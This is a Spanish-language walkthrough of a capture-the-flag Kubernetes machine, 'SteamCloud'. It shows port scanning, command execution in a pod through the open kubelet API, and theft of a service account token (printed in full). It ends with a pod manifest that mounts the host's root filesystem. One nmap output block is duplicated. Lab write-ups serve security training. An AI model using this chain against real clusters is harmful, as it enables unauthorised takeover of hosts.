# Steamcloud

<table>
  <tr>
    <td style="vertical-align: top; padding-right: 20px;">
      <img src="portadas/SteamCloud.png" alt="SteamCloud" style="max-width:320px; width:100%; height:auto;"/>
    </td>
    <td style="vertical-align: top; padding-left: 20px;">
      <strong>Vulnerabilidades / Características a tratar</strong>
      <ul>
        <li>Kubernetes API Enumeration (kubectl)</li>
        <li>Kubelet API Enumeration (kubeletctl)</li>
        <li>Command Execution through kubeletctl on the containers</li>
        <li>Cluster Authentication (ca.crt / token files) with kubectl</li>
        <li>Creating YAML file for POD creation</li>
        <li>Executing commands on the new POD</li>
        <li>Reverse Shell through YAML file while deploying the POD</li>
      </ul>
    </td>
  </tr>
</table>


## Reconocimiento inicial
Realizamos un escaneo de todos los puertos para comprobar cuáles estan abiertos y lo exportamos al fichero `allports` 

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.133 -oG allports
```

```shell
PORT      STATE SERVICE     REASON
22/tcp    open  ssh         syn-ack ttl 63
2379/tcp  open  etcd-client syn-ack ttl 63
2380/tcp  open  etcd-server syn-ack ttl 63
8443/tcp  open  https-alt   syn-ack ttl 63
10249/tcp open  unknown     syn-ack ttl 63
10250/tcp open  unknown     syn-ack ttl 63
10256/tcp open  unknown     syn-ack ttl 63
```

Si hacemos un escaneo más concreto hacia esos puertos e intentamos obtener más información:

```shell
nmap -sCV -p22,2379,2380,8443,10249,10250,10256 10.10.11.133
```

```shell
PORT      STATE SERVICE          VERSION
22/tcp    open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 fc:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c (RSA)
|   256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 (ECDSA)
|_  256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 (ED25519)
2379/tcp  open  ssl/etcd-client?
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  h2
| ssl-cert: Subject: commonName=steamcloud
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2025-10-09T11:58:40
|_Not valid after:  2026-10-09T11:58:40
2380/tcp  open  ssl/etcd-server?
| ssl-cert: Subject: commonName=steamcloud
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2025-10-09T11:58:40
|_Not valid after:  2026-10-09T11:58:41
| tls-alpn: 
|_  h2
|_ssl-date: TLS randomness does not represent time
8443/tcp  open  ssl/http         Golang net/http server
| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
| Not valid before: 2025-10-08T11:58:38
|_Not valid after:  2028-10-08T11:58:38
| tls-alpn: 
|   h2
|_  http/1.1
|_http-title: Site doesn't have a title (application/json).
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: da7419cb-92c9-47e1-98ae-b64e6ed5e36f
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: b480f3bb-ede2-4111-b7b6-39a9334c5d8f
|     X-Kubernetes-Pf-Prioritylevel-Uid: d22ef3db-178a-4671-904e-241dfbd2417e
|     Date: Thu, 09 Oct 2025 12:02:06 GMT
|     Content-Length: 212
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/nice ports,/Trinity.txt.bak"","reason":"Forbidden","details":{},"code":403}
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: bad66ebb-bd90-447c-9de2-9158dde05abe
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: b480f3bb-ede2-4111-b7b6-39a9334c5d8f
|     X-Kubernetes-Pf-Prioritylevel-Uid: d22ef3db-178a-4671-904e-241dfbd2417e
|     Date: Thu, 09 Oct 2025 12:02:05 GMT
|     Content-Length: 185
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: c3bc3673-7a99-4d41-86d6-b612e2d7d6de
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: b480f3bb-ede2-4111-b7b6-39a9334c5d8f
|     X-Kubernetes-Pf-Prioritylevel-Uid: d22ef3db-178a-4671-904e-241dfbd2417e
|     Date: Thu, 09 Oct 2025 12:02:05 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
|_ssl-date: TLS randomness does not represent time
10249/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
10250/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=steamcloud@1760011123
| Subject Alternative Name: DNS:steamcloud
| Not valid before: 2025-10-09T10:58:42
|_Not valid after:  2026-10-09T10:58:42
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
10256/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.95%T=SSL%I=7%D=10/9%Time=68E7A43D%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,22F,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x20bad66
SF:ebb-bd90-447c-9de2-9158dde05abe\r\nCache-Control:\x20no-cache,\x20priva
SF:te\r\nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x20n
SF:osniff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x20b480f3bb-ede2-4111-b7b6-39
SF:a9334c5d8f\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x20d22ef3db-178a-4671-
SF:904e-241dfbd2417e\r\nDate:\x20Thu,\x2009\x20Oct\x202025\x2012:02:05\x20
SF:GMT\r\nContent-Length:\x20185\r\n\r\n{\"kind\":\"Status\",\"apiVersion\
SF:":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden
SF::\x20User\x20\\\"system:anonymous\\\"\x20cannot\x20get\x20path\x20\\\"/
SF:\\\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n")%r(HTTP
SF:Options,233,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x20c3bc3673-7a9
SF:9-4d41-86d6-b612e2d7d6de\r\nCache-Control:\x20no-cache,\x20private\r\nC
SF:ontent-Type:\x20application/json\r\nX-Content-Type-Options:\x20nosniff\
SF:r\nX-Kubernetes-Pf-Flowschema-Uid:\x20b480f3bb-ede2-4111-b7b6-39a9334c5
SF:d8f\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x20d22ef3db-178a-4671-904e-24
SF:1dfbd2417e\r\nDate:\x20Thu,\x2009\x20Oct\x202025\x2012:02:05\x20GMT\r\n
SF:Content-Length:\x20189\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"v1\
SF:",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden:\x20Us
SF:er\x20\\\"system:anonymous\\\"\x20cannot\x20options\x20path\x20\\\"/\\\
SF:"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n")%r(FourOhF
SF:ourRequest,24A,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x20da7419cb-
SF:92c9-47e1-98ae-b64e6ed5e36f\r\nCache-Control:\x20no-cache,\x20private\r
SF:\nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x20nosni
SF:ff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x20b480f3bb-ede2-4111-b7b6-39a933
SF:4c5d8f\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x20d22ef3db-178a-4671-904e
SF:-241dfbd2417e\r\nDate:\x20Thu,\x2009\x20Oct\x202025\x2012:02:06\x20GMT\
SF:r\nContent-Length:\x20212\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"
SF:v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden:\x2
SF:0User\x20\\\"system:anonymous\\\"\x20cannot\x20get\x20path\x20\\\"/nice
SF:\x20ports,/Trinity\.txt\.bak\\\"\",\"reason\":\"Forbidden\",\"details\"
SF::{},\"code\":403}\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.96 secondsPORT      STATE SERVICE          VERSION
22/tcp    open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 fc:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c (RSA)
|   256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 (ECDSA)
|_  256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 (ED25519)
2379/tcp  open  ssl/etcd-client?
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  h2
| ssl-cert: Subject: commonName=steamcloud
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2025-10-09T11:58:40
|_Not valid after:  2026-10-09T11:58:40
2380/tcp  open  ssl/etcd-server?
| ssl-cert: Subject: commonName=steamcloud
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2025-10-09T11:58:40
|_Not valid after:  2026-10-09T11:58:41
| tls-alpn: 
|_  h2
|_ssl-date: TLS randomness does not represent time
8443/tcp  open  ssl/http         Golang net/http server
| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
| Not valid before: 2025-10-08T11:58:38
|_Not valid after:  2028-10-08T11:58:38
| tls-alpn: 
|   h2
|_  http/1.1
|_http-title: Site doesn't have a title (application/json).
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: da7419cb-92c9-47e1-98ae-b64e6ed5e36f
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: b480f3bb-ede2-4111-b7b6-39a9334c5d8f
|     X-Kubernetes-Pf-Prioritylevel-Uid: d22ef3db-178a-4671-904e-241dfbd2417e
|     Date: Thu, 09 Oct 2025 12:02:06 GMT
|     Content-Length: 212
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/nice ports,/Trinity.txt.bak"","reason":"Forbidden","details":{},"code":403}
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: bad66ebb-bd90-447c-9de2-9158dde05abe
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: b480f3bb-ede2-4111-b7b6-39a9334c5d8f
|     X-Kubernetes-Pf-Prioritylevel-Uid: d22ef3db-178a-4671-904e-241dfbd2417e
|     Date: Thu, 09 Oct 2025 12:02:05 GMT
|     Content-Length: 185
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: c3bc3673-7a99-4d41-86d6-b612e2d7d6de
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: b480f3bb-ede2-4111-b7b6-39a9334c5d8f
|     X-Kubernetes-Pf-Prioritylevel-Uid: d22ef3db-178a-4671-904e-241dfbd2417e
|     Date: Thu, 09 Oct 2025 12:02:05 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
|_ssl-date: TLS randomness does not represent time
10249/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
10250/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=steamcloud@1760011123
| Subject Alternative Name: DNS:steamcloud
| Not valid before: 2025-10-09T10:58:42
|_Not valid after:  2026-10-09T10:58:42
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
10256/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.95%T=SSL%I=7%D=10/9%Time=68E7A43D%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,22F,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x20bad66
SF:ebb-bd90-447c-9de2-9158dde05abe\r\nCache-Control:\x20no-cache,\x20priva
SF:te\r\nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x20n
SF:osniff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x20b480f3bb-ede2-4111-b7b6-39
SF:a9334c5d8f\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x20d22ef3db-178a-4671-
SF:904e-241dfbd2417e\r\nDate:\x20Thu,\x2009\x20Oct\x202025\x2012:02:05\x20
SF:GMT\r\nContent-Length:\x20185\r\n\r\n{\"kind\":\"Status\",\"apiVersion\
SF:":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden
SF::\x20User\x20\\\"system:anonymous\\\"\x20cannot\x20get\x20path\x20\\\"/
SF:\\\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n")%r(HTTP
SF:Options,233,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x20c3bc3673-7a9
SF:9-4d41-86d6-b612e2d7d6de\r\nCache-Control:\x20no-cache,\x20private\r\nC
SF:ontent-Type:\x20application/json\r\nX-Content-Type-Options:\x20nosniff\
SF:r\nX-Kubernetes-Pf-Flowschema-Uid:\x20b480f3bb-ede2-4111-b7b6-39a9334c5
SF:d8f\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x20d22ef3db-178a-4671-904e-24
SF:1dfbd2417e\r\nDate:\x20Thu,\x2009\x20Oct\x202025\x2012:02:05\x20GMT\r\n
SF:Content-Length:\x20189\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"v1\
SF:",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden:\x20Us
SF:er\x20\\\"system:anonymous\\\"\x20cannot\x20options\x20path\x20\\\"/\\\
SF:"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n")%r(FourOhF
SF:ourRequest,24A,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x20da7419cb-
SF:92c9-47e1-98ae-b64e6ed5e36f\r\nCache-Control:\x20no-cache,\x20private\r
SF:\nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x20nosni
SF:ff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x20b480f3bb-ede2-4111-b7b6-39a933
SF:4c5d8f\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x20d22ef3db-178a-4671-904e
SF:-241dfbd2417e\r\nDate:\x20Thu,\x2009\x20Oct\x202025\x2012:02:06\x20GMT\
SF:r\nContent-Length:\x20212\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"
SF:v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden:\x2
SF:0User\x20\\\"system:anonymous\\\"\x20cannot\x20get\x20path\x20\\\"/nice
SF:\x20ports,/Trinity\.txt\.bak\\\"\",\"reason\":\"Forbidden\",\"details\"
SF::{},\"code\":403}\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.96 seconds
```

Vemos que hay un muchos puertos que se encunetra abiertos se pueden apreciar tecnologia de `kubernetes` 


## Enumeramos los contenerdores de kubernetes.

Usando la herramienta `kubeletctl` podemos enumerar los diferentes `pods`que existen en la máquina.

```shell
kubeletctl -s 10.10.11.133 pods
```
obtenemos el siguiente resultado de los diferentes pods:

```shell
┌────────────────────────────────────────────────────────────────────────────────┐
│                                Pods from Kubelet                               │
├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
│   │ POD                                │ NAMESPACE   │ CONTAINERS              │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 1 │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 2 │ storage-provisioner                │ kube-system │ storage-provisioner     │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 3 │ kube-proxy-hnt2l                   │ kube-system │ kube-proxy              │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 4 │ coredns-78fcd69978-h5hnn           │ kube-system │ coredns                 │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 5 │ nginx                              │ default     │ nginx                   │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 6 │ etcd-steamcloud                    │ kube-system │ etcd                    │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 7 │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 8 │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │
│   │                                    │             │                         │
└───┴────────────────────────────────────┴─────────────┴─────────────────────────┘
                                                                                   
```

Vemos que el pod `nginx` nos llama la atención porque se encuentra en un namespace que es default.

con el siguiente comando podemos averiguar si podemos ejecutar comandos en el pod 

```shell
kubeletctl -s 10.10.11.133 scan rce
```
y obtenemos que el pod nginx podemos ejecutarlo porque tiene un `+`

Por lo tanto si todo va bien ejecutando el siguiente comando vamos a aobtner un usuario que este corriendo en ese pod.

```shell
kubeletctl -s 10.10.11.133 -p nginx -c nginx exec "whoami"
```

Como era de esperar obtenemos un usuario en nuestro caso es `root` vamos a intentar obtener una `bash` usando el mismo comando:

```shell
kubeletctl -s 10.10.11.133 -p nginx -c nginx exec "bash"
```
de esta manera obtneemos la terminal y la primera flag de usuario.

## Escalada de privilegios

Para la escalada de privilegios y usuando la siguiente info de hacktricks vemos que exite un directorio donde podemos obtener el token y el certificado para auntenticarnos con con `kubectl`

Para ello vamos al directorio donde se encuentra estos ficheros:

```shell
root@nginx:~# ls /run/secrets/kubernetes.io/serviceaccount
ca.crt  namespace  token
```

podemos ver que existen por lo tanto estos ficheros nos lo copiamos a nuestro equipo para posteriormente intentar autenticarnos.

```shell
kubectl -s https://10.10.11.133:8443 --certificate-authority=ca.crt --token='eyJhbGciOiJSUzI1NiIsImtpZCI6InpBNk5zRjZ5VFgtYjU3S1pjSEc2V0lYd1B6SWpVcmwzR1BhaFhkTkUwY1EifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzkxNTUyOTg5LCJpYXQiOjE3NjAwMTY5ODksImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6IjVhMGE3MDAyLTc0NDItNGU2Yy1iZmY1LWQ1MWY0NzZiMTc2NiJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6ImVhMGE3MDI3LTJjMmQtNGE3Yy1hYmZmLTRlMDViMDhhYmExYyJ9LCJ3YXJuYWZ0ZXIiOjE3NjAwMjA1OTZ9LCJuYmYiOjE3NjAwMTY5ODksInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.Rdp33LC4i8Am8vk_hlfTaZ3F_MXuK-bGIVn7OdM32_Lxfn-doC7tBzwyual5yJ-8Lwa-kwVT1u4zimaEKHlNTySWJx8feVbpkntOwz6uSK8DCbJTHJMvRR4NoogY9yoTyiS2nEDZ7qWP_oihTONS519-iutMaFAo4S_mN2XuuLEf6HtLuSrH1IKnOSbCklvMHKSBhA6E-Zoh-FZESgoSRAZt5XWW7B8YQGObsFKrS42OTjJ4YCAOL4hEu4AeKJ91hirUPP4yO6C8z165uBy4UfUjvP2MacR8BygTbJwJbZhJAn8jodQzvku84s1IpSWBCZiC9k0i1BRXhE10Awr2NQ' get pod
```

Vemos que hemos podido auneticarnos y obtenemos que solo existe un pod:
```shell
NAME    READY   STATUS    RESTARTS   AGE
nginx   1/1     Running   0          145m
```

Revisando otros comando he comprabado que existe uno que es `can-i`que ppuedes preguntarle sobre algo en cocreto es por ello que si hacemos el siguiente comando obtneemos que podemos crear un nuevo pod utilizando uno ya existente y borrando las partes no relevantes.

```shell
kubectl -s https://10.10.11.133:8443 --certificate-authority=ca.crt --token='$TOKEN' auth can-i --list
```

Vemos que obtenemos que podemos crear pods

```shell
Resources                                       Non-Resource URLs                     Resource Names   Verbs
pods                                     [get create list]

```

Para generar un nuevo pod utilizamos el playbook en `yaml` de esta manera crearemos un pod llamado `fer-pods` en la que montaremos en la carpeta `/mnt` del pod la carpeta `/` de la máquina víctima  para asi obtner la flag de root

```shell
apiVersion: v1
kind: Pod
metadata:
  name: fer-pods
  namespace: default
spec:
  containers:
  - name: fer-pods
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:
      path: /
```

Para desplegar el pod utilizamos el siguiente comando: 

```shell
kubectl -s https://10.10.11.133:8443 --certificate-authority=ca.crt --token='$TOKEN' apply -f evil.yaml  
```

de esta manera obtnemos un nuevo pod llamado `fer-pods` en el qe si accedemos de la manera paercida a la anteriormente podemos ver que en el directorio mnt tenemos todo el sistema de la máquina víctima.
